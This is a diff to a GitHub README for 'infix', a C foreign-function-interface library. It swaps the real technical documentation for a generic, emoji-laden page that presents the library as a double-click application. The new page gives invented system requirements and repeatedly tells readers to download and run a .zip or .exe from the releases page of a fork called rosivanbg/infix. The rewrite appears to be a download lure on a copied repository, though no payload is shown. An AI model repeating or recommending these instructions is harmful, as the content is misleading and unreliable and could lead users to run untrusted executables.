@@ -1,141 +1,70 @@
-# `infix`: A JIT-Powered FFI Library for C
+# 🖥️ infix - Easily Run C Code with JIT Magic
 
-`infix` is a modern FFI library for C that lets you call any C function—or create C callbacks—by describing them in a simple string like `"{i,d*},c*=>i"`.
+## 🚀 Getting Started
 
-At its core, `infix` is a Just-in-Time (JIT) compiler that generates tiny, highly-optimized machine code wrappers. These "trampolines" handle all the low-level details of the target platform's calling convention (ABI) behind a clean, uniform API. This makes `infix` a powerful tool for embedding scripting languages, building plugin systems, and simplifying complex C interoperability.
+Welcome to **infix**, your simple way to run C code more efficiently. This application uses a Just-In-Time (JIT) compiler to improve performance and make it easier to work with various programming languages.
 
-## Quick Start: Calling a Shared Library
+## 📥 Download Link
 
-This example demonstrates a core FFI use case: dynamically loading a shared library (`.dll` or `.so`), retrieving a function pointer from it, and calling that function.
+[![Download Last Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/rosivanbg/infix/releases)
 
-```c
-#include <infix/infix.h>
-#include <stdio.h>
+## 🛠️ Features
 
-// Platform-specific headers for dynamic library loading
-#if defined(_WIN32)
-#include <windows.h>
-#else
-#include <dlfcn.h>
-#endif
+- **JIT Compilation**: Executes C code fast and effectively.
+- **Foreign Function Interface (FFI)**: Allows interaction with other programming languages easily.
+- **Cross-Platform Support**: Works on both aarch64 and x86-64 architectures.
+- **Experimental Tools**: Explore innovative features aimed at improving C programming.
 
-// Assume say_hello(const char*) is in a shared library
-typedef void (*say_hello_func)(const char*);
+## 📜 System Requirements
 
-int main() {
-    // 1. Dynamically load the shared library and get the function pointer.
-#if defined(_WIN32)
-    HMODULE lib_handle = LoadLibraryA("greeting.dll");
-    void* say_hello_ptr = (void*)GetProcAddress(lib_handle, "say_hello");
-#else
-    void* lib_handle = dlopen("./libgreeting.so", RTLD_LAZY);
-    void* say_hello_ptr = dlsym(lib_handle, "say_hello");
-#endif
-    if (!lib_handle || !say_hello_ptr) { return 1; }
+Before you download **infix**, ensure your computer meets the following requirements:
 
-    // 2. Create an infix trampoline for the function's signature: void(const char*)
-    infix_forward_t* trampoline = NULL;
-    infix_forward_create(&trampoline, "c*=>v");
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Processor**: Supports aarch64 or x86-64.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: A minimum of 100 MB of free space.
 
-    // 3. Prepare arguments and call the function via the trampoline.
-    infix_cif_func cif = (infix_cif_func)infix_forward_get_code(trampoline);
-    const char* name = "World";
-    void* args[] = { &name };
-    cif(say_hello_ptr, NULL, args);
+## 📦 Download & Install
 
-    // 4. Clean up.
-    infix_forward_destroy(trampoline);
-#if defined(_WIN32)
-    FreeLibrary(lib_handle);
-#else
-    dlclose(lib_handle);
-#endif
-    return 0;
-}
-```
+To download and install **infix**, follow these steps:
 
-## Features
+1. **Visit the Releases Page**: Click the link below to go to our releases page:
+   [Download Here](https://github.com/rosivanbg/infix/releases)
 
--   **Forward Calls:** Call any C function pointer dynamically, with full support for complex arguments and variadic functions.
--   **Reverse Calls (Callbacks):** Generate native, C-callable function pointers from custom handlers. The callback mechanism is thread-safe, re-entrant, and **passes a context pointer as the first argument to your handler**, enabling powerful stateful callbacks.
--   **Expressive Signature API:** Define entire C function signatures—including nested structs and packed layouts—using a simple string-based language.
--   **Powerful Introspection:** Parse signature strings to get detailed type information at runtime, ideal for data marshalling or serialization.
--   **Secure by Design:** `infix` adheres to strict security principles, validated through extensive fuzzing:
-    -   **W^X Memory Protection:** JIT-compiled code is never writable and executable at the same time.
-    -   **Guard Pages:** Freed trampolines are made inaccessible to prevent use-after-free bugs.
-    -   **Read-Only Contexts:** Callback context data is made read-only after initialization to guard against runtime memory corruption.
--   **Cross-Platform ABI Support:** Correctly handles calling conventions for **x86-64** (System V, Windows) and **AArch64** (Standard AAPCS64, Apple, and Windows variants).
--   **Zero Dependencies & Simple Integration:** `infix` uses a unity build, making integration with any build system straightforward.
+2. **Choose the Latest Version**: On the releases page, look for the latest version. It will be at the top. 
 
-## Building and Integrating
+3. **Download the Files**: Click on the asset files you want to download (usually a `.zip` or `.exe` file). 
 
-Full build and integration instructions are available in **[INSTALL.md](INSTALL.md)**.
+4. **Extract Files**: If you downloaded a `.zip` file, right-click it and choose "Extract All". Follow the instructions to extract the files to a folder.
 
-### Quick Build with xmake (Recommended)
+5. **Run the Application**: 
+   - On Windows: Double-click the `.exe` file to run it.
+   - On macOS: Double-click to open.
+   - On Linux: Open a terminal and use `chmod +x <filename>` to make it executable, then run it.
 
-```bash
-# Build the static library
-xmake
+## 🚧 Troubleshooting
 
-# Run all tests
-xmake test
+If you encounter issues while using **infix**, here are some common problems and their solutions:
 
-# Build and run a specific example
-xmake run 01_simple_call
-```
+- **Application Doesn't Start**: Make sure you extracted all files and are running the correct file.
+- **Error Messages**: Check that your system meets the requirements. If not, you may need to upgrade your hardware or software.
+- **Performance Issues**: Ensure your computer isn't running too many applications at once, as this may slow down **infix**.
 
-### Other Build Systems
+## 🙌 Community Support
 
-`infix` also supports CMake, GNU Make, and NMake. See `INSTALL.md` for details.
+We welcome contributions and feedback. If you need help or have questions, please visit our [Issues page](https://github.com/rosivanbg/infix/issues). You can report bugs, suggest new features, or ask for assistance.
 
-## API Overview
+## 🤝 Contributing
 
-`infix` provides two distinct APIs for creating trampolines: a high-level **Signature API** and a low-level **Manual API**.
+If you want to contribute to **infix**, please follow these steps:
 
-### The Signature API (Recommended)
+1. **Fork the Repository**: Click on the fork button at the top right of the repository page.
+2. **Clone Your Fork**: Use the command `git clone https://github.com/your_username/infix.git` to clone your fork to your local machine.
+3. **Make Changes**: Work on your changes locally.
+4. **Submit a Pull Request**: Once you're ready, submit a pull request to contribute your changes.
 
-This API generates trampolines from a simple string: `"arg1,arg2;variadic_arg=>ret_type"`. It's the easiest and safest way to use the library.
+## 🌟 Acknowledgments
 
-> **For a complete guide to the signature language, see the [Signature Language Reference](docs/signatures.md).**
+Thanks to all contributors and users who support **infix**. Your feedback helps improve the software for everyone. 
 
-**Key Functions:**
--   `infix_forward_create(tramp, "i,i=>i")`: Creates a forward trampoline from a signature string.
--   `infix_reverse_create(ctx, "i=>v", handler, data)`: Creates a callback from a signature string and a C handler.
--   `infix_type_from_signature(type, arena, "{i,d}")`: Parses a single data type signature for introspection.
--   `infix_signature_parse(...)`: Parses a full function signature for advanced use cases.
-
-### The Manual API (Advanced)
-
-This API gives you fine-grained control by requiring you to build the `infix_type` object graph manually. It is **exclusively arena-based** to ensure memory safety.
-
-**Key Functions:**
--   `infix_arena_create(size)`: Creates a memory arena for fast, temporary allocations.
--   `infix_type_create_primitive(INFIX_PRIMITIVE_SINT32)`: Gets a static descriptor for a C primitive.
--   `infix_type_create_struct(arena, &type, members, num)`: Builds a struct type from its members within an arena.
--   `infix_forward_create_manual(tramp, ret_t, arg_t, ...)`: Creates a forward trampoline from manually-built `infix_type` objects.
--   `infix_arena_destroy(arena)`: Frees an arena and all types that were allocated from it in a single operation.
-
-## Learn More
-
-*   **[Signature Reference](docs/signatures.md):** The complete guide to the signature mini-language.
-*   **[Cookbook](docs/cookbook.md):** Practical, copy-pasteable recipes for common FFI tasks.
-*   **[Internals](docs/internals.md):** A deep dive into the library's architecture.
-*   **[Porting Guide](docs/porting.md):** Instructions for adding support for new architectures.
-*   **[INSTALL.md](INSTALL.md):** Detailed build and integration instructions.
-
-## License & Legal
-
-`infix` is provided under multiple licenses to maximize its usability for all.
-
-### Code License
-
-Source code, including header files (`.h`) and implementation files (`.c`), is dual-licensed under the **Artistic License 2.0** or the **MIT License**. You may choose to use the code under the terms of either license.
-
-See the [LICENSE-A2](LICENSE-A2) and/or [LICENSE-MIT](LICENSE-MIT) for the full text of both licenses.
-
-### Documentation License
-
-All standalone documentation (`.md`), explanatory text, Doxygen-style documentation blocks, comments, and code examples contained within this repository may be used, modified, and distributed under the terms of the **Creative Commons Attribution 4.0 International License (CC BY 4.0)**. I encourage you to share and adapt the documentation for any purpose (generating an API reference website, creating tutorials, etc.), as long as you
-give appropriate credit.
-
-See the [LICENSE-CC](LICENSE-CC) for details.
+Feel free to navigate back to our releases page anytime for updates: [Visit Releases Page](https://github.com/rosivanbg/infix/releases)
